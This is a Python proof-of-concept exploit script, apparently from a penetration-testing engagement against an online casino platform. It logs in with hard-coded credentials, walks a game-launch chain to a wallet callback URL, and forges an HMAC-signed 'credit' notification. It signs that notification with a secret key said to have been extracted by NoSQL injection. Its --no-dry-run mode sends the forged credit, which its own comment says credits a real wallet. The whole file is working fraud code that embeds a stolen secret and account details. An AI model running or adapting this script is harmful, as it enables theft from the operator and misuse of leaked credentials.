#!/usr/bin/env python3
"""
F40 PoC: Z-Seamless credit injection via wallet callback forgery.
Engagement: WE88Z-VAK88-2026-09

Attack chain:
  1. player JWT → POST /mb/enter-game → ifgtameh.site#fragment
  2. fragment   → POST iframeapi.ifuse-api.com/getLaunchGameData → ssoKey + wallet_url
  3. ssoKey + JILI secret_key (F02) → forge HMAC-signed credit → POST wallet_url/credit

Usage:
  python3 probe_zs_credit_inject.py [--dry-run] [--amount 100]
  --dry-run : build and print the forged payload, do NOT send it (default)
  --amount N: credit amount in THB (default: 100)
"""
import requests, json, pathlib, time, hmac, hashlib, uuid, sys, argparse, base64

DRY_RUN_DEFAULT = True  # safety: always dry-run unless --no-dry-run

TID_V   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI_V = f"https://{TID_V}pbapi.asdgapicenterssdo.com"
MGAPI_V = f"https://{TID_V}mgapi.asdgapicenterssdo.com"
ZS_API  = "https://iframeapi.ifuse-api.com"

# JILI secret_key extracted via F02 NoSQL injection (pbapi_latest_win.json)
JILI_SECRET_KEY = "a68a21221d37222969b99ea0463be0f0a9e51d2ce70aedf28afbeec96ec88e82"

# Known provider ID for JILI
JILI_PROVIDER_ID = "a20e0d50-2faf-11f0-930b-06f3ddf48b9d"

def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("--dry-run", dest="dry_run", action="store_true", default=True)
    p.add_argument("--no-dry-run", dest="dry_run", action="store_false")
    p.add_argument("--amount", type=float, default=100.0, help="Credit amount THB")
    return p.parse_args()

def auth(username="0972571110", password="Pwned2026!"):
    r = requests.post(f"{PBAPI_V}/pb/authentication",
        json={"strategy": "local", "username": username, "password": password},
        headers={"Content-Type": "application/json"}, timeout=15)
    r.raise_for_status()
    jwt = r.json()["accessToken"]
    pathlib.Path(".jwt.vak88z2").write_text(jwt)
    sub = json.loads(base64.urlsafe_b64decode(jwt.split(".")[1] + "==")).get("sub", "?")
    print(f"[auth] OK — sub={sub[:8]}...")
    return jwt

def find_jili_game(jwt):
    hdrs = {"Authorization": f"Bearer {jwt}", "Content-Type": "application/json", "template": "vn"}
    r = requests.get(f"{PBAPI_V}/pb/game-list", headers=hdrs, params={"$limit": 200}, timeout=10)
    games = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    for g in games:
        if JILI_PROVIDER_ID in g.get("provider_id", ""):
            return g["id"], g.get("name", "?")
    return None, None

def enter_game(jwt, game_list_id):
    hdrs = {"Authorization": f"Bearer {jwt}", "Content-Type": "application/json", "template": "vn"}
    r = requests.post(f"{MGAPI_V}/mb/enter-game", headers=hdrs,
        json={"game_list_id": game_list_id, "languageCode": "th"}, timeout=15)
    if not r.ok or r.status_code not in (200, 201):
        raise RuntimeError(f"enter-game failed: {r.status_code} {r.text[:200]}")
    url = r.json().get("result", {}).get("url", "")
    if "ifgtameh.site" not in url:
        raise RuntimeError(f"Not a Z-Seamless game URL: {url[:120]}")
    fragment = url.split("#", 1)[1]
    print(f"[enter-game] fragment={fragment[:60]}...")
    return fragment

def resolve_game(fragment):
    r = requests.post(f"{ZS_API}/getLaunchGameData",
        headers={"Content-Type": "application/json"},
        json={"token": fragment}, timeout=15)
    r.raise_for_status()
    resp = r.json()
    if not resp.get("ok"):
        raise RuntimeError(f"getLaunchGameData failed: {resp}")
    data = json.loads(resp["result"]["data"])
    game_url = data["url"]
    print(f"[resolve] game_url={game_url[:100]}")

    # Parse query params from game URL
    from urllib.parse import urlparse, parse_qs
    qs = parse_qs(urlparse(game_url).query)
    sso_key = qs.get("ssoKey", [None])[0]
    api_id  = qs.get("apiId", ["1701"])[0]
    be_rev  = qs.get("be", [""])[0]          # reversed domain (e.g. moc.888hsulflayor.ipabewbw)
    wallet_domain = be_rev[::-1]              # un-reverse → wbwebapi.royalflush888.com

    print(f"[resolve] ssoKey={sso_key}")
    print(f"[resolve] apiId={api_id}")
    print(f"[resolve] wallet_domain={wallet_domain}")
    return sso_key, api_id, f"https://{wallet_domain}"

def jili_sign(secret_key: str, fields: list) -> str:
    """JILI HMAC-SHA256: sign concatenated field values."""
    msg = "".join(str(f) for f in fields).encode()
    return hmac.new(secret_key.encode(), msg, hashlib.sha256).hexdigest()

def build_credit_payload(sso_key, api_id, amount_thb, secret_key):
    """
    Construct a JILI Z-Seamless credit (win) notification.
    Field order / signing scheme based on JILI seamless wallet spec v2.x:
      sign = HMAC-SHA256(apiId + token + txnId + amount, secret)
    Amount in credits (1 THB = 1 credit in most JILI configs).
    """
    txn_id  = str(uuid.uuid4()).replace("-", "").upper()[:24]
    round_id = str(uuid.uuid4()).replace("-", "").upper()[:16]
    amount  = int(amount_thb * 100)  # convert to satang/credits

    sign = jili_sign(secret_key, [api_id, sso_key, txn_id, amount])

    payload = {
        "apiId":   int(api_id),
        "token":   sso_key,
        "txnId":   txn_id,
        "roundId": round_id,
        "gameCode":"641",
        "amount":  amount,
        "sign":    sign,
    }
    return payload

def main():
    args = parse_args()
    print(f"{'[DRY RUN] ' if args.dry_run else '[LIVE] '}F40 Z-Seamless credit injection PoC")
    print(f"Amount: {args.amount} THB\n")

    # Step 1 — auth
    jwt = auth()

    # Step 2 — find active JILI game
    game_id, game_name = find_jili_game(jwt)
    if not game_id:
        print("[!] No active JILI game found. Exiting.")
        sys.exit(1)
    print(f"[game] {game_name} ({game_id})")

    # Step 3 — enter game → get fragment
    fragment = enter_game(jwt, game_id)

    # Step 4 — resolve to wallet URL
    sso_key, api_id, wallet_url = resolve_game(fragment)

    # Step 5 — build forged credit payload
    payload = build_credit_payload(sso_key, api_id, args.amount, JILI_SECRET_KEY)
    credit_url = f"{wallet_url}/credit"

    print(f"\n[payload] POST {credit_url}")
    print(json.dumps(payload, indent=2))

    if args.dry_run:
        print("\n[DRY RUN] Payload constructed — not sent.")
        print("Re-run with --no-dry-run to execute (LIVE IMPACT: credits real wallet).")
        return

    # Step 6 — send forged credit
    print("\n[LIVE] Sending forged credit...")
    r = requests.post(credit_url,
        headers={"Content-Type": "application/json"},
        json=payload, timeout=15)
    print(f"[result] HTTP {r.status_code}")
    print(f"[result] {r.text[:500]}")

if __name__ == "__main__":
    main()
